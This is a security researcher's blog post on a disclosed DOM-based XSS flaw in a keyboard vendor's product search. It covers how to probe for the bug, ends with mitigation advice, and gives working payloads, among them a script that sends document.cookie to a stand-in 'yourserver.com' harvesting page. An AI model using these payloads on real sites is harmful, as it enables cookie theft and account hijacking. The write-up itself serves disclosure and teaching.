---
layout: post
title: "Zero-Day Research:  Mechanical Keyboard Finder Version 4.31"
featured-img: mk0day
author: Josiah Bryan
category: [Zero Day Research]
---

## Introduction
In this edition of *Zero-Day Research*, I happen to come across a DOM-based Cross Site Scripting Vulnerability in 'Mechanical Keyboard's (MK's) Famous Mechanical Keyboard Finder (Version 4.31)' and helped their team verify the issue upon request. I have to give lots of kudos to the awesome security team at MK. They quickly responded and patched the issue within a day of disclosure. If more vendors were as serious as MK about security, our nation's overall cyber posture would be in much better shape. MK is an industry-leading mechanical keyboard vendor with unique varieties of mechanical keyboards for sale. You can check them out [here](https://mechanicalkeyboards.com).

## Disclosure and Disclaimer
The Cross Site Scripting vulnerability was responsibly disclosed and verified (upon request) to the MK security team. This post was intended for web developers who are interested in keeping their applications secure and is for **EDUCATIONAL PURPOSES ONLY**. I do not condone illegal activity and cannot be held responsible for the misuse of this information.

## Cross Site Scripting
Cross-Site Scripting (XSS) is a common web vulnerability that allows an attacker to inject malicious javascript into normal websites. XSS is a client-side attack, where the end-user connecting to the application is the victim. This enables attackers to steal credentials, hijack accounts, access sensitive data, and much more. For more information on cross-site scripting, PortSwigger has fantastic in-depth [articles](https://portswigger.net/web-security/cross-site-scripting) explaining the different types of XSS and how they can impact end-users.

## DOM Based XSS
[OWASP](https://www.owasp.org/index.php/DOM_Based_XSS) refers to DOM Based XSS as "an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment”. The DOM in this context is the "Document Object Model", or the tree structure and programming interface that is used to construct HTML web pages:


![DOMexample](/assets/img/posts/DOMexample.png)<br/>


DOM-based XSS can be more difficult to discover than other forms of XSS because it requires a detailed review of how and where the user input is stored within the DOM. Context is the most important aspect when searching for DOM XSS because the location where user input is stored will almost certainly be different in each scenario and application.

## Identifying Vulnerable Parameters
The overall process for identifying DOM XSS bugs is simple:

1. See if the application stores user input somewhere in the DOM
2. See if the application filters certain characters or sanitizes the input. If the application sanitizes user input using techniques like HTML or javascript encoding, DOM XSS might not exist in the application.
3. If the application stores user input without sanitization, you can guarantee some extent of XSS is possible. Even with a Web Application Firewall (WAF) in play, there is an infinite amount of XSS filter bypasses that can be applied to the payload. Only upon request with full permission from the vendor should you every POC (or verify) the vulnerability on a live application. Given that we have permission to verify, we can then start crafting an attack based on where the input is stored in the DOM.

Let's start with a basic request like so:

```
xss
```

We can then search for our unique 'xss' term in the DOM after the request has been made:
* In Firefox (or any browser), right-click on the results page and select 'View Page Source':
* On the HTML source page, select Control/Command+f the find a term


![source](/assets/img/posts/basic_source.png)
<br/>
<br/>

After verifying the location and presence of our search term in the DOM we can add a few special characters to the end of the term like so:

```
xss>"'
```


Repeating the previous few steps we can verify if our new search term is stored in the DOM without being converted to an HTML entity. A basic list of basic HTML entities is shown below:

![entities](/assets/img/posts/entities_html.png)

In this particular situation, the special characters were not converted to HTML entities. That being said, we can close off the encompassing attribute or tag as a part of our search term and effectively add our code to the DOM.


## Payload Crafting

In this context we want to craft a payload that closes off the quote and preceding h3 tag and continue to execute some code:
```
Sample payload: 

'</h3><img src=x onerror=prompt(document.domain)>
```
This will cleanly close off the encompassing h3 tag and allow us to execute code that will pop up an alert to the screen with the name of the vulnerable domain:

![alert](/assets/img/posts/domain_redac.png)

It worked! <br/><br/>**Note**: in scenarios where the application does some form of basic input sanitization searching for bad characters we could url encode our payload like so:

```
Sample payload encoded: 
%3C%2Fh3%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E
```

## Taking it Further
This XSS bug not only modifies the DOM but is reflected in the URL. This means we could carry out the XSS attack by providing a simple link in a phishing campaign. Collecting user cookies at this point is trivial:

```
'</h3><img src=x onerror=prompt(document.cookie)>
```

![cookies](/assets/img/posts/cookie_redac.png)

Harvesting cookies and shipping them off to a remote server is also quite simple:
```
'</h3><script>document.location='http://yourserver.com/cookieharvest.php?d='+document.cookie;</script>
```

From here the possibilities are endless. There are quite a few XSS [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) on the web. Some possible attack scenarios include: 

* Account Hijacking
* Port Scanning
* Spying/Keylogging
* Browser Hooking with [BeEF](https://beefproject.com/)
* Installing Backdoors/Malware

## Mitigation

DOM XSS can be hard for automated scanners to find at times because of its dynamic nature. This type of bug is quite common across the Internet but can be prevented by treating all user input as malicious and sanitizing the data in question. 

PHP (the language used by this site) offers useful functions to achieve sanitization, such as [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) and [htmlentities()](https://www.php.net/manual/en/function.htmlentities.php). These functions will automatically convert special characters to HTML entities. Most languages offer these types of libraries and functions to make sanitizing user input quite easy. One mistake developers make is attempting to implement filtering and sanitization using client-side controls. Each user has complete control over the client, rendering client-side sanitization efforts useless.

## References

* https://portswigger.net/web-security/cross-site-scripting
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
* https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 
* https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
* https://www.geeksforgeeks.org/dhtml-javascript/
* https://mechanicalkeyboards.com/about.php 
* https://www.owasp.org/index.php/DOM_Based_XSS
* https://www.w3schools.com/html/html_entities.asp
* https://www.google.com/about/appsecurity/learning/xss/
* https://www.php.net/manual/en/function.htmlspecialchars.php
* https://www.php.net/manual/en/function.htmlentities.php

<br/><br/>
**Proverbs 2:6-8**<br/>
For the Lord gives wisdom; from his mouth come knowledge and understanding...